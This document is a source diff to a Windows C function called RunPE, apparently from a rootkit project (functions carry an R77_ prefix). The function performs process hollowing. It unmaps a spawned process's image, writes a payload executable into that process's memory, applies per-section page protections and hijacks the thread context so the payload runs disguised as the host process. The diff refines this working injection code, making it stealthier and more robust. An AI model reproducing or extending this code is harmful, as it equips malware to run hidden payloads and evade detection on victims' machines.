@@ -705,6 +705,13 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 			// Cannot inject 64-bit payload from 32-bit process.
 			return FALSE;
 		}
+
+		if (!isPayload64Bit && BITNESS(64) && !IsAtLeastWindows10())
+		{
+			// Wow64 RunPE requires at least Windows 10.
+			//TODO: Custom implementation for Wow64GetThreadContext and Wow64SetThreadContext required to work on Windows 7.
+			return FALSE;
+		}
 	}
 	else
 	{
@@ -733,49 +740,63 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
 				{
-					BOOL sectionsWritten = TRUE;
-
-					for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+					DWORD oldProtect;
+					if (VirtualProtectEx(processInformation.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect))
 					{
-						PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + j * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER);
-
-						if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeader->VirtualAddress, (LPBYTE)payload + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
+						BOOL sectionsWritten = TRUE;
+						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
+						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
 						{
-							sectionsWritten = FALSE;
-							break;
-						}
-					}
-
-					if (sectionsWritten)
-					{
-						LPCONTEXT context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-						if (context)
-						{
-							context->ContextFlags = CONTEXT_FULL;
-
-							if (GetThreadContext(processInformation.hThread, context))
+							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
 							{
+								sectionsWritten = FALSE;
+								break;
+							}
+
+							if (!VirtualProtectEx(
+								processInformation.hProcess,
+								(LPBYTE)imageBase + sectionHeaders[j].VirtualAddress,
+								j == ntHeaders->FileHeader.NumberOfSections - 1 ? ntHeaders->OptionalHeader.SizeOfImage - sectionHeaders[j].VirtualAddress : sectionHeaders[j + 1].VirtualAddress - sectionHeaders[j].VirtualAddress,
+								SectionCharacteristicsToProtection(sectionHeaders[j].Characteristics),
+								&oldProtect
+							))
+							{
+								sectionsWritten = FALSE;
+								break;
+							}
+						}
+
+						if (sectionsWritten)
+						{
+							LPCONTEXT context = (LPCONTEXT)VirtualAlloc(NULL, sizeof(CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+							if (context)
+							{
+								context->ContextFlags = CONTEXT_FULL;
+
+								if (GetThreadContext(processInformation.hThread, context))
+								{
 #ifdef _WIN64
-								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + 16), &ntHeaders->OptionalHeader.ImageBase, 8, NULL))
-								{
-									context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-									if (SetThreadContext(processInformation.hThread, context) &&
-										ResumeThread(processInformation.hThread) != -1)
+									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Rdx + 16), &ntHeaders->OptionalHeader.ImageBase, 8, NULL))
 									{
-										return TRUE;
+										context->Rcx = (DWORD64)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+										if (SetThreadContext(processInformation.hThread, context) &&
+											ResumeThread(processInformation.hThread) != -1)
+										{
+											return TRUE;
+										}
 									}
-								}
 #else
-								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
-								{
-									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-									if (SetThreadContext(processInformation.hThread, context) &&
-										ResumeThread(processInformation.hThread) != -1)
+									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
 									{
-										return TRUE;
+										context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+										if (SetThreadContext(processInformation.hThread, context) &&
+											ResumeThread(processInformation.hThread) != -1)
+										{
+											return TRUE;
+										}
 									}
-								}
 #endif
+								}
 							}
 						}
 					}
@@ -785,47 +806,55 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 			{
 				// Spawn 32-bit process from this 64-bit process.
 
-				if (!IsAtLeastWindows10())
-				{
-					//TODO: Custom implementation for Wow64GetThreadContext and Wow64SetThreadContext required to work on Windows 7.
-					return FALSE;
-				}
-
 				PIMAGE_NT_HEADERS32 ntHeaders = (PIMAGE_NT_HEADERS32)(payload + ((PIMAGE_DOS_HEADER)payload)->e_lfanew);
 				R77_NtUnmapViewOfSection(processInformation.hProcess, ntHeaders->OptionalHeader.ImageBase);
 
 				LPVOID imageBase = VirtualAllocEx(processInformation.hProcess, (LPVOID)ntHeaders->OptionalHeader.ImageBase, ntHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 				if (imageBase && WriteProcessMemory(processInformation.hProcess, imageBase, payload, ntHeaders->OptionalHeader.SizeOfHeaders, NULL))
 				{
-					BOOL sectionsWritten = TRUE;
-
-					for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
+					DWORD oldProtect;
+					if (VirtualProtectEx(processInformation.hProcess, imageBase, ntHeaders->OptionalHeader.SizeOfHeaders, PAGE_READONLY, &oldProtect))
 					{
-						PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeaders) + j * (ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER);
-
-						if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeader->VirtualAddress, (LPBYTE)payload + sectionHeader->PointerToRawData, sectionHeader->SizeOfRawData, NULL))
+						BOOL sectionsWritten = TRUE;
+						PIMAGE_SECTION_HEADER sectionHeaders = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(ntHeaders);
+						for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; j++)
 						{
-							sectionsWritten = FALSE;
-							break;
-						}
-					}
-
-					if (sectionsWritten)
-					{
-						PWOW64_CONTEXT context = (PWOW64_CONTEXT)VirtualAlloc(NULL, sizeof(WOW64_CONTEXT), MEM_COMMIT, PAGE_READWRITE);
-						if (context)
-						{
-							context->ContextFlags = WOW64_CONTEXT_FULL;
-
-							if (Wow64GetThreadContext(processInformation.hThread, context))
+							if (!WriteProcessMemory(processInformation.hProcess, (LPBYTE)imageBase + sectionHeaders[j].VirtualAddress, (LPBYTE)payload + sectionHeaders[j].PointerToRawData, sectionHeaders[j].SizeOfRawData, NULL))
 							{
-								if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
+								sectionsWritten = FALSE;
+								break;
+							}
+
+							if (!VirtualProtectEx(
+								processInformation.hProcess,
+								(LPBYTE)imageBase + sectionHeaders[j].VirtualAddress,
+								j == ntHeaders->FileHeader.NumberOfSections - 1 ? ntHeaders->OptionalHeader.SizeOfImage - sectionHeaders[j].VirtualAddress : sectionHeaders[j + 1].VirtualAddress - sectionHeaders[j].VirtualAddress,
+								SectionCharacteristicsToProtection(sectionHeaders[j].Characteristics),
+								&oldProtect
+							))
+							{
+								sectionsWritten = FALSE;
+								break;
+							}
+						}
+
+						if (sectionsWritten)
+						{
+							PWOW64_CONTEXT context = (PWOW64_CONTEXT)VirtualAlloc(NULL, sizeof(WOW64_CONTEXT), MEM_COMMIT, PAGE_READWRITE);
+							if (context)
+							{
+								context->ContextFlags = WOW64_CONTEXT_FULL;
+
+								if (Wow64GetThreadContext(processInformation.hThread, context))
 								{
-									context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
-									if (Wow64SetThreadContext(processInformation.hThread, context) &&
-										ResumeThread(processInformation.hThread) != -1)
+									if (WriteProcessMemory(processInformation.hProcess, (LPVOID)(context->Ebx + 8), &ntHeaders->OptionalHeader.ImageBase, 4, NULL))
 									{
-										return TRUE;
+										context->Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
+										if (Wow64SetThreadContext(processInformation.hThread, context) &&
+											ResumeThread(processInformation.hThread) != -1)
+										{
+											return TRUE;
+										}
 									}
 								}
 							}
@@ -846,6 +875,41 @@ BOOL RunPE(LPCWSTR path, LPBYTE payload)
 	}
 
 	return FALSE;
+}
+DWORD SectionCharacteristicsToProtection(DWORD characteristics)
+{
+	if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_READ) && (characteristics & IMAGE_SCN_MEM_WRITE))
+	{
+		return PAGE_EXECUTE_READWRITE;
+	}
+	else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_READ))
+	{
+		return PAGE_EXECUTE_READ;
+	}
+	else if ((characteristics & IMAGE_SCN_MEM_EXECUTE) && (characteristics & IMAGE_SCN_MEM_WRITE))
+	{
+		return PAGE_EXECUTE_WRITECOPY;
+	}
+	else if ((characteristics & IMAGE_SCN_MEM_READ) && (characteristics & IMAGE_SCN_MEM_WRITE))
+	{
+		return PAGE_READWRITE;
+	}
+	else if (characteristics & IMAGE_SCN_MEM_EXECUTE)
+	{
+		return PAGE_EXECUTE;
+	}
+	else if (characteristics & IMAGE_SCN_MEM_READ)
+	{
+		return PAGE_READONLY;
+	}
+	else if (characteristics & IMAGE_SCN_MEM_WRITE)
+	{
+		return PAGE_WRITECOPY;
+	}
+	else
+	{
+		return PAGE_NOACCESS;
+	}
 }
 DWORD GetExecutableFunction(LPBYTE image, LPCSTR functionName)
 {
